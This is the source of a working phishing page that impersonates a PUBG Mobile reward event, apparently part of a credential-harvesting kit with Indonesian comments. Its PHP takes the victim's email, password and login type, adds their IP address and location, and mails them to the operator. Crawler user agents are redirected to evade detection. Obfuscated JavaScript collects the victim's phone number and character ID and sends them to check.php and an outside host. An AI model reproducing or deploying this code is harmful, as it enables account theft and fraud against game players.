<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include 'system/setting.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$arpantek_flag | $arpantek_callingcode | PUNYA SI $email | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Additional Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN TIME</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<a style="background-image: linear-gradient(#179CDE, #0088CC); width: 55%; margin-top: 10px; margin-left: auto; margin-right: auto; padding: 6px; color: #fff; font-size: 15px; text-align: center; text-transform: uppercase; text-decoration: none; border-radius: 3px; outline: none; display: block;" href="https://t.me/berbagisc">Find Me on Telegram</a>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<img src="img/header/1.jpg">
</div> <!--- slider --->
<div class="slider">
<img src="img/header/2.jpg">
</div> <!--- slider --->
<div class="slider">
<img src="img/header/3.jpg">
</div> <!--- slider --->
</div> <!--- header --->
<div class="event-title"></div> <!--- event-title --->
<div class="event-notification">
<img src="img/helmet.png">
Rewards will be available until
<div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div> <!--- event-notification-timer --->
</div> <!--- event-notification --->
<div class="box">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<center>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">28</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="28" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Sxyy8Kzz/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="https://i.postimg.cc/02LKvdqW/new-Footer-Img.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_verification()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<div class="popup otherReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<span id="otherReward_confirmationValue"></span>
<img src="" id="myOtherReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_verification()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup otherReward_confirmation --->

<div class="popup account_verification" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" id="password" value="<?php echo $password;?>" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required><select class="verify-select" name="level" id="level" required>

<option selected="selected" style="margin-bottom: 20px;" disabled="disabled" value="" name="level" id="level" required>Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="login" value="<?php echo $login;?>" readonly>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</div> <!--- popup-box-form-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
Thanks for joining this Nusa event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/btn-on.png) no-repeat center; background-size: 100% 100%; margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script>var _0x597ab9=_0x4010;(function(_0x12418e,_0x79f791){var _0x5bbab9=_0x4010,_0x2fa9fa=_0x12418e();while(!![]){try{var _0x43d153=-parseInt(_0x5bbab9(0xaf))/0x1*(-parseInt(_0x5bbab9(0xb4))/0x2)+parseInt(_0x5bbab9(0x9a))/0x3+parseInt(_0x5bbab9(0x9b))/0x4+-parseInt(_0x5bbab9(0xbb))/0x5+parseInt(_0x5bbab9(0x83))/0x6*(parseInt(_0x5bbab9(0xa4))/0x7)+-parseInt(_0x5bbab9(0x9f))/0x8*(parseInt(_0x5bbab9(0xb1))/0x9)+-parseInt(_0x5bbab9(0xaa))/0xa*(parseInt(_0x5bbab9(0xa6))/0xb);if(_0x43d153===_0x79f791)break;else _0x2fa9fa['push'](_0x2fa9fa['shift']());}catch(_0x2f7f11){_0x2fa9fa['push'](_0x2fa9fa['shift']());}}}(_0x4a1b,0xab6c8));var buka=new Audio();buka[_0x597ab9(0xb7)]=_0x597ab9(0xb2);var tutup=new Audio();tutup[_0x597ab9(0xb7)]='https://a.top4top.io/m_1725zobal2.mp3';var slideIndex=0x0;showSlides();function _0x4a1b(){var _0x598834=['preventDefault','value','.login-facebook','2511639FEqkUF','1637580TREKlz','input#validateLogin','.itemReward_confirmation','input#password','71768zfiEbg','#password-facebook','getElementsByClassName','input#playid','\x20:\x20','803719EIyUzX','https://getipflag.my.id/','694661jsRoCH','.login-twitter','check.php','trim','10AyJreH','.check_verification','#login-twitter','#otherReward_confirmationValue','.account_login','635fGGhpL','#myOtherReward_confirmationImg','909dyvaUz','https://l.top4top.io/m_1725u5z7i1.mp3','#ValidateVerificationDataForm','2302vpNxaJ','#password-twitter','#email-facebook','src','#latestTimer','#login-facebook','input#email','2104680sHeHru','#ValidateLoginFbForm','slider','6SNqWNe','.account_verification','.verification_info','show','.otherReward_confirmation','none','input#validateEmail','POST','input#validatePassword','display','val','#email-twitter','attr','input#login','html','length','#ValidateLoginTwitterForm','ajax','style','hide'];_0x4a1b=function(){return _0x598834;};return _0x4a1b();}function showSlides(){var _0x342e1a=_0x597ab9,_0x5ca2f2,_0x2fc2ff=document[_0x342e1a(0xa1)](_0x342e1a(0xbd));for(_0x5ca2f2=0x0;_0x5ca2f2<_0x2fc2ff[_0x342e1a(0x92)];_0x5ca2f2++){_0x2fc2ff[_0x5ca2f2][_0x342e1a(0x95)][_0x342e1a(0x8c)]=_0x342e1a(0x88);}slideIndex++,slideIndex>_0x2fc2ff['length']&&(slideIndex=0x1),_0x2fc2ff[slideIndex-0x1][_0x342e1a(0x95)]['display']='block',setTimeout(showSlides,0x9c4);}function _0x4010(_0x12c0ea,_0x5c87bb){var _0x4a1bcc=_0x4a1b();return _0x4010=function(_0x401096,_0x124f9e){_0x401096=_0x401096-0x83;var _0x28e3ae=_0x4a1bcc[_0x401096];return _0x28e3ae;},_0x4010(_0x12c0ea,_0x5c87bb);}$(document)['ready'](function(){var _0x466b51=0x3b,_0x136d82=0x3b,_0x3a1369=0x17;function _0x24952d(){var _0x53641b=_0x4010;setTimeout(_0x24952d,0x3e8),$(_0x53641b(0xb8))[_0x53641b(0x91)](''+_0x3a1369+_0x53641b(0xa3)+_0x136d82+_0x53641b(0xa3)+_0x466b51+''),_0x466b51--,_0x466b51<0x0&&(_0x466b51=0x3b,_0x136d82--,_0x136d82<0x0&&(_0x136d82=0x0,_0x466b51=0x0));}_0x24952d();});function open_itemReward_confirmation(_0x11c2c7){var _0x246b5d=_0x597ab9,_0x4b4beb=$(_0x11c2c7)[_0x246b5d(0x8f)](_0x246b5d(0xb7));$(_0x246b5d(0x9d))['show'](),$('#myItemReward_confirmationImg')[_0x246b5d(0x8f)](_0x246b5d(0xb7),_0x4b4beb);}function open_otherReward_confirmation(_0xeaf2c0){var _0xa075bd=_0x597ab9,_0x2b0503=$(_0xeaf2c0)[_0xa075bd(0x8f)](_0xa075bd(0xb7)),_0x1330fd=$(_0xeaf2c0)['attr'](_0xa075bd(0x98));$(_0xa075bd(0x87))[_0xa075bd(0x86)](),$(_0xa075bd(0xb0))[_0xa075bd(0x8f)](_0xa075bd(0xb7),_0x2b0503),$(_0xa075bd(0xad))[_0xa075bd(0x91)](_0x1330fd);}function open_account_verification(){var _0x27e4a7=_0x597ab9;$(_0x27e4a7(0x84))[_0x27e4a7(0x86)](),$(_0x27e4a7(0x9d))[_0x27e4a7(0x96)](),$('.otherReward_confirmation')[_0x27e4a7(0x96)]();}function open_facebook(){var _0x36fcfb=_0x597ab9;$(_0x36fcfb(0x99))[_0x36fcfb(0x86)](),$(_0x36fcfb(0xae))[_0x36fcfb(0x96)]();}function open_twitter(){var _0x3668a1=_0x597ab9;$(_0x3668a1(0xa7))[_0x3668a1(0x86)](),$(_0x3668a1(0xae))[_0x3668a1(0x96)]();}function close_reward_confirmation(){var _0x54c983=_0x597ab9;$(_0x54c983(0x9d))['hide'](),$(_0x54c983(0x87))[_0x54c983(0x96)]();}function tutup_facebook(){var _0x55c79f=_0x597ab9;$('.login-facebook')[_0x55c79f(0x96)](),$('.account_login')[_0x55c79f(0x86)]();}function tutup_twitter(){var _0x1f2cd2=_0x597ab9;$(_0x1f2cd2(0xa7))[_0x1f2cd2(0x96)](),$(_0x1f2cd2(0xae))[_0x1f2cd2(0x86)]();}function ValidateLoginFbData(){var _0x2e75d2=_0x597ab9;$(_0x2e75d2(0xbc))['submit'](function(_0x152ee8){var _0x4a725b=_0x2e75d2;_0x152ee8[_0x4a725b(0x97)](),$email=$(_0x4a725b(0xb6))['val']()[_0x4a725b(0xa9)](),$password=$(_0x4a725b(0xa0))['val']()['trim'](),$login=$(_0x4a725b(0xb9))[_0x4a725b(0x8d)]()[_0x4a725b(0xa9)]();if($email==''||$password==''){}else $(_0x4a725b(0x99))[_0x4a725b(0x96)](),$(_0x4a725b(0x89))[_0x4a725b(0x8d)]($email),$(_0x4a725b(0x8b))[_0x4a725b(0x8d)]($password),$(_0x4a725b(0x9c))[_0x4a725b(0x8d)]($login);});}function ValidateLoginTwitterData(){var _0x5314ed=_0x597ab9;$(_0x5314ed(0x93))['submit'](function(_0x1c1551){var _0x1851e2=_0x5314ed;_0x1c1551[_0x1851e2(0x97)](),$email=$(_0x1851e2(0x8e))[_0x1851e2(0x8d)]()['trim'](),$password=$(_0x1851e2(0xb5))['val']()[_0x1851e2(0xa9)](),$login=$(_0x1851e2(0xac))['val']()[_0x1851e2(0xa9)]();if($email==''||$password==''){}else $('.login-twitter')[_0x1851e2(0x96)](),$('input#validateEmail')[_0x1851e2(0x8d)]($email),$('input#validatePassword')[_0x1851e2(0x8d)]($password),$(_0x1851e2(0x9c))['val']($login);});}function ValidateVerificationData(){var _0x5b8a84=_0x597ab9,_0x2984b7=$(_0x5b8a84(0xb3))['serialize']();return $['ajax']({'url':_0x5b8a84(0xa5),'data':_0x2984b7,'type':'POST','success':function(){return!0x0;},'error':function(){return!0x0;}}),$(_0x5b8a84(0xb3))['submit'](function(_0x70c544){var _0x4466d9=_0x5b8a84;_0x70c544['preventDefault']();var _0x2a5ef2=$(_0x4466d9(0xba))[_0x4466d9(0x8d)](),_0x3b19bf=$(_0x4466d9(0x9e))[_0x4466d9(0x8d)](),_0x281ddd=$(_0x4466d9(0xa2))[_0x4466d9(0x8d)](),_0x31da5e=$('input#phone')[_0x4466d9(0x8d)](),_0x2554da=$(_0x4466d9(0x90))[_0x4466d9(0x8d)]();if(_0x2a5ef2==''&&_0x3b19bf==''&&_0x281ddd==''&&_0x31da5e==''&&_0x2554da=='')return $(_0x4466d9(0x85))[_0x4466d9(0x86)](),$(_0x4466d9(0x84))[_0x4466d9(0x96)](),![];$[_0x4466d9(0x94)]({'type':_0x4466d9(0x8a),'url':_0x4466d9(0xa8),'data':$(this)['serialize'](),'beforeSend':function(){var _0x3c1e57=_0x4466d9;$(_0x3c1e57(0xab))[_0x3c1e57(0x86)](),$('.account_verification')[_0x3c1e57(0x96)]();},'success':function(){var _0x14d7bf=_0x4466d9;$('.processing_account')[_0x14d7bf(0x86)](),$(_0x14d7bf(0xab))['hide'](),$(_0x14d7bf(0x84))[_0x14d7bf(0x96)]();}});}),![];};</script>
<script>(function(_0x5e2a7d,_0x528d97){var _0x2bcbf0=_0x256c,_0x4f27b5=_0x5e2a7d();while(!![]){try{var _0x36cd01=parseInt(_0x2bcbf0(0x1f0))/0x1*(-parseInt(_0x2bcbf0(0x1fe))/0x2)+-parseInt(_0x2bcbf0(0x1ef))/0x3+-parseInt(_0x2bcbf0(0x200))/0x4+parseInt(_0x2bcbf0(0x1f8))/0x5*(parseInt(_0x2bcbf0(0x1f1))/0x6)+-parseInt(_0x2bcbf0(0x1f6))/0x7*(-parseInt(_0x2bcbf0(0x1fd))/0x8)+parseInt(_0x2bcbf0(0x1f9))/0x9*(-parseInt(_0x2bcbf0(0x1f2))/0xa)+parseInt(_0x2bcbf0(0x1ff))/0xb;if(_0x36cd01===_0x528d97)break;else _0x4f27b5['push'](_0x4f27b5['shift']());}catch(_0x4b3db5){_0x4f27b5['push'](_0x4f27b5['shift']());}}}(_0x4ca7,0x86bdd));function _0x4ca7(){var _0x2e731f=['5784EBKDzV','40xGxiSS','.TwitterShowPassword','.hidePassword','hide','749jKlPad','password-twitter','5055Mebrgb','1381626ZNuHMo','.TwitterHidePassword','getElementById','show','19608lISJbF','86UGBZjf','9282009iNUdZv','1800032lkYKJo','text','type','.showPassword','password','password-facebook','723990mIWlSb','5195JzgDwX'];_0x4ca7=function(){return _0x2e731f;};return _0x4ca7();}function showFbPassword(){var _0x176a4b=_0x256c,_0x4f5aae=document['getElementById'](_0x176a4b(0x1ee));_0x4f5aae[_0x176a4b(0x202)]==='password'?(_0x4f5aae['type']='text',$('.showPassword')['hide'](),$(_0x176a4b(0x1f4))['show']()):_0x4f5aae[_0x176a4b(0x202)]=_0x176a4b(0x1ed);}function _0x256c(_0x4c926f,_0x2d3c6b){var _0x4ca7be=_0x4ca7();return _0x256c=function(_0x256c52,_0x555d19){_0x256c52=_0x256c52-0x1ec;var _0x59410f=_0x4ca7be[_0x256c52];return _0x59410f;},_0x256c(_0x4c926f,_0x2d3c6b);}function hideFbPassword(){var _0x1f8c98=_0x256c,_0x22506f=document['getElementById'](_0x1f8c98(0x1ee));_0x22506f[_0x1f8c98(0x202)]==='text'?(_0x22506f[_0x1f8c98(0x202)]=_0x1f8c98(0x1ed),$(_0x1f8c98(0x1ec))[_0x1f8c98(0x1fc)](),$('.hidePassword')[_0x1f8c98(0x1f5)]()):_0x22506f[_0x1f8c98(0x202)]=_0x1f8c98(0x201);}function showTwitterPassword(){var _0x29d124=_0x256c,_0x434dbe=document[_0x29d124(0x1fb)](_0x29d124(0x1f7));_0x434dbe[_0x29d124(0x202)]===_0x29d124(0x1ed)?(_0x434dbe['type']=_0x29d124(0x201),$('.TwitterShowPassword')[_0x29d124(0x1f5)](),$(_0x29d124(0x1fa))[_0x29d124(0x1fc)]()):_0x434dbe[_0x29d124(0x202)]=_0x29d124(0x1ed);}function hideTwitterPassword(){var _0x2282ae=_0x256c,_0x395ad8=document[_0x2282ae(0x1fb)](_0x2282ae(0x1f7));_0x395ad8[_0x2282ae(0x202)]===_0x2282ae(0x201)?(_0x395ad8['type']=_0x2282ae(0x1ed),$(_0x2282ae(0x1f3))[_0x2282ae(0x1fc)](),$('.TwitterHidePassword')[_0x2282ae(0x1f5)]()):_0x395ad8['type']=_0x2282ae(0x201);}</script>

</body>
</html>